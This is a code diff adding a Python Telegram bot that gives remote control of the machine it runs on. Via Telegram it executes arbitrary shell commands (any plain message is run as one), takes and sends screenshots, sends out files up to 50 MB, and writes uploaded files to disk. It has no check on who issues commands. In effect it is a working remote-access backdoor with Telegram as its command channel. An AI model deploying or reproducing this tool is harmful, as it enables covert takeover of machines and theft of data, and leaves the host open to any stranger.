@@ -1,0 +1,113 @@
+import os
+import pyautogui
+import subprocess
+import config
+import telebot
+import requests
+from telebot import types
+
+#provide your token in config.py
+#token="234567890asdfghjk"
+
+bot = telebot.TeleBot(config.token)
+decode_charset="utf-8"
+hint_cmd=0
+def download_file(url,filename):
+    if len(filename) > 0:
+        local_filename = filename
+    else:
+        local_filename = url.split('/')[-1]
+    print("Download "+url+" into "+local_filename)
+    # NOTE the stream=True parameter below
+    r=requests.get(url, stream=True)
+    r.raise_for_status()
+    with open(local_filename, 'wb') as f:
+        for chunk in r.iter_content(chunk_size=8192): 
+            if chunk: # filter out keep-alive new chunks
+                f.write(chunk)
+                # f.flush()
+    return local_filename
+
+def shell(query):
+    global decode_charset
+    cmd = "bash"   #specify your cmd command
+    process = subprocess.Popen(query,shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+    out = process.stdout.read() + process.stderr.read()
+    return out.decode(decode_charset)
+ 
+@bot.message_handler(commands=["cmd"])
+def cmd(message):
+    if message.text:
+        print("received:"+message.text[5:])
+        try:
+            result=shell(message.text[5:])
+            if result is not None:
+                if len(result)>3000:
+                    for i in range(0,1+int(round(len(result)/3000))):	
+                        bot.send_message(message.chat.id, result[i*3000:i*3000+2999])
+                else:
+                    bot.send_message(message.chat.id, result)
+        except Exception as error:
+            bot.send_message(message.chat.id, "Error: " +str(error))
+
+@bot.message_handler(commands=["screenshot"])
+def screenshot(message):
+    pic = pyautogui.screenshot()
+    pic.save('Screenshot.png') 
+    bot.send_photo(message.chat.id, photo=open('screenshot.PNG', 'rb'))
+
+@bot.message_handler(commands=["cd"])
+def cd(message):
+    try:
+        os.chdir(message.text[4:])
+        print("change dir: "+message.text[4:])
+    except Exception as error:
+        bot.send_message(message.chat.id, "Error: " +str(error))
+
+@bot.message_handler(commands=["charset"])
+def charset(message):
+    global decode_charset
+    if len(message.text[9:]) >0: 
+        decode_charset=message.text[9:]
+        print("set charset: "+decode_charset)
+    else:
+        bot.send_message(message.chat.id, decode_charset)
+
+@bot.message_handler(commands=["help"])
+def charset(message):
+    bot.send_message(message.chat.id, """Remote bot commands:
+/help - get help
+/charset [charset] - set/get charset
+/cd [folder] - change folder
+/screenshot - make and send screenshot of screen
+/cmd [command] - run shell command
+/get [filename] - download file <50Mb
+-------------------------------------
+any other message will be as a command
+upload files via attach
+ """)
+
+@bot.message_handler(commands=["get"])
+def get(message):
+    if os.path.getsize(message.text[5:]) >  52428800 :
+        bot.send_message(message.chat.id, "Size is bigger than 50Mb: " +str(os.path.getsize(message.text[5:])))
+    else:
+        bot.send_document(message.chat.id, open(message.text[5:], 'rb'))
+
+@bot.message_handler(content_types=['document'])
+def handle_text_doc(message):
+    f=bot.get_file(file_id=message.document.file_id)
+    print("download file "+str(message.document)+" "+str(f))
+    try:
+        download_file("https://api.telegram.org/file/bot"+config.token+"/"+f.file_path,message.document.file_name)
+    except Exception as error:
+        bot.send_message(message.chat.id, "Error: " +str(error))
+
+@bot.message_handler()
+def other_messages(message):
+    global hint_cmd
+    message.text="/cmd "+message.text
+    cmd(message)
+
+if __name__ == '__main__':
+    bot.polling(none_stop=True)
